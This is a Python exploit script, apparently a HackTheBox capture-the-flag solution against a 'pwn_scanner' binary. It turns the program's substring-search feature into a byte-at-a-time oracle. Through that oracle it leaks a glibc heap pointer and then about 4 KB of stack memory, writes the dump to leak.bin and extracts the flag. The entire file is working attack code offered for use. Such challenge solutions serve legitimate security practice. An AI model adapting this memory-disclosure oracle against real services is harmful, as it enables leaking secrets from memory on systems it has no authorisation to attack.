#!/usr/bin/env python3
import argparse
import os
import re
import socket
import struct
import subprocess
import sys


class Tube:
    def __init__(self, host=None, port=None):
        self.buf = b""
        if host:
            self.sock = socket.create_connection((host, port))
            self.proc = None
        else:
            here = os.path.join(os.path.dirname(__file__), "Scanner", "pwn_scanner")
            self.proc = subprocess.Popen(
                ["./scanner"], cwd=here, stdin=subprocess.PIPE,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            )
            self.sock = None

    def send(self, data):
        if self.sock:
            self.sock.sendall(data)
        else:
            self.proc.stdin.write(data)
            self.proc.stdin.flush()

    def recv(self):
        if self.sock:
            return self.sock.recv(65536)
        return os.read(self.proc.stdout.fileno(), 65536)

    def until(self, marker):
        while marker not in self.buf:
            chunk = self.recv()
            if not chunk:
                raise EOFError(self.buf)
            self.buf += chunk
        end = self.buf.index(marker) + len(marker)
        out, self.buf = self.buf[:end], self.buf[end:]
        return out


def p64(x):
    return struct.pack("<Q", x)


def chunk_size(request):
    # glibc 2.31 request2size() on amd64
    return max(0x20, (request + 8 + 15) & ~15)


class Oracle:
    def __init__(self, tube):
        self.t = tube
        self.last_request = None
        self.ptr = None
        self.bin_ptrs = {}
        self.top = None
        self.t.until(b"> ")
        self.t.send(b"1\n")
        self.t.until(b"Enter new buffer: ")
        self.t.send(b"A" * 4095 + b"\n")
        self.t.until(b"> ")

    def query(self, needle):
        n = len(needle)
        if not 1 <= n <= 4096:
            raise ValueError("invalid needle length")
        self.t.send(b"3\n")
        self.t.until(b"Enter parameters: ")
        self.t.send(b"naive1 " + str(n).encode() + b"\n")
        self.t.send(needle + b"\n")
        out = self.t.until(b"> ")
        return b"Found at i=4095" in out

    def query_candidates(self, prefix, candidates):
        request = len(prefix) + 1
        packet = bytearray()
        for candidate in candidates:
            needle = prefix + bytes([candidate])
            packet += b"3\nnaive1 " + str(request).encode() + b"\n"
            packet += needle + b"\n"
        self.t.send(packet)
        answer = None
        for candidate in candidates:
            out = self.t.until(b"> ")
            if b"Found at i=4095" in out:
                answer = candidate
        return answer

    def leak_initial_heap_pointer(self):
        known = b""
        common = [0xa0, 0xc0, 0xe0, 0x20, 0x40, 0x60, 0x80, 0,
                  0x55, 0x56, 0x57, 0x7f, 0xff]
        candidates = list(dict.fromkeys(common + list(range(256))))
        for _ in range(8):
            candidate = self.query_candidates(b"\0" + known, candidates)
            if candidate is None:
                raise RuntimeError("could not leak initial heap pointer")
            known += bytes([candidate])
            print(f"\r[+] heap bytes: {known.hex()}", end="", flush=True)
        print()
        self.ptr = struct.unpack("<Q", known)[0]
        self.last_request = 9
        self.bin_ptrs[chunk_size(9)] = self.ptr
        self.top = self.ptr + chunk_size(9)
        return self.ptr

    def pointer_for_request(self, request):
        size = chunk_size(request)
        if size in self.bin_ptrs:
            self.ptr = self.bin_ptrs[size]
        elif size > 0x410:
            # Above tcache_max the freed chunk consolidates back into the top
            # chunk, so successive large temporary needles reuse this address.
            self.ptr = self.top
        else:
            self.ptr = self.top
            self.bin_ptrs[size] = self.ptr
            self.top += size
        self.last_request = request
        return self.ptr

    def leak_stack(self, count):
        leaked = b""
        priority = b"\0\n HTB{}_-/.:=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        candidates = list(dict.fromkeys(priority + bytes(range(256))))
        while len(leaked) < count:
            index = len(leaked)
            # Stack alignment can leave kilobytes of zero padding.  Test and
            # consume it a block at a time instead of spending one RTT/byte.
            if leaked.endswith(b"\0" * 16):
                zero_count = min(128, count - len(leaked))
                zero_request = 1 + 8 + 4 + 4 + len(leaked) + zero_count
                zero_ptr = self.pointer_for_request(zero_request)
                zero_prefix = (b"\0" + p64(zero_ptr) +
                               struct.pack("<II", zero_request, 0) + leaked)
                if self.query(zero_prefix + b"\0" * zero_count):
                    leaked += b"\0" * zero_count
                    print(f"\r[{len(leaked):4d}] skipped {zero_count} zero bytes",
                          end="", flush=True)
                    continue

            # The eight bytes following the heap pointer are live main()
            # locals: uint32_t data_size (the current request length) and
            # scanner_index (zero for naive1).  Rebuild them for every query.
            request = 1 + 8 + 4 + 4 + len(leaked) + 1
            ptr = self.pointer_for_request(request)
            prefix = b"\0" + p64(ptr) + struct.pack("<II", request, 0) + leaked
            candidate = self.query_candidates(prefix, candidates)
            if candidate is None:
                raise RuntimeError(f"leak failed at stack offset {index:#x}")
            leaked += bytes([candidate])
            shown = bytes(c if 32 <= c < 127 else ord(".") for c in leaked[-64:])
            print(f"\r[{len(leaked):4d}] {shown.decode()}", end="", flush=True)
            match = re.search(rb"HTB\{[^}\r\n]{1,200}\}", leaked)
            if match:
                print()
                return leaked, match.group().decode()
        print()
        return leaked, None


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default=None)
    parser.add_argument("--port", type=int, default=32084)
    parser.add_argument("--bytes", type=int, default=4078,
                        help="bytes above main's locals (maximum: 4078)")
    args = parser.parse_args()
    if not 1 <= args.bytes <= 4078:
        parser.error("--bytes must be between 1 and 4078")

    tube = Tube(args.host, args.port)
    oracle = Oracle(tube)
    heap = oracle.leak_initial_heap_pointer()
    print(f"[+] heap allocation: {heap:#x}")
    data, flag = oracle.leak_stack(args.bytes)
    with open("leak.bin", "wb") as output:
        output.write(data)
    if flag:
        print(f"[+] flag: {flag}")
        return
    print("[-] no flag found; raw disclosure saved to leak.bin")
    sys.exit(1)


if __name__ == "__main__":
    main()
